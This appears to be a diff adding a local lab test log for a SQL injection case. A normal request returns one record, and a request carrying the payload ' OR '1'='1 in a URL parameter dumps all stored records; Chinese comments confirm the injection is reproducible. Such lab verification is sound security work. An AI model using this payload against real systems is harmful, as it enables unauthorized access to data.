@@ -1,0 +1,7 @@
+URL: http://127.0.0.1:4280/lab_cases/S001/index.php?name=Alice
+<h1>查询结果</h1><p>ID 1：Alice</p>
+URL: http://127.0.0.1:4280/lab_cases/S001/index.php?name=%27+OR+%271%27%3D%271
+<h1>查询结果</h1><p>ID 1：Alice</p><p>ID 2：Bob</p><p>ID 3：Carol</p>
+普通对照通过: True
+注入对照通过: True
+OBSERVED: 普通输入仅返回 Alice；测试输入返回全部预置记录，SQL 注入可复现。
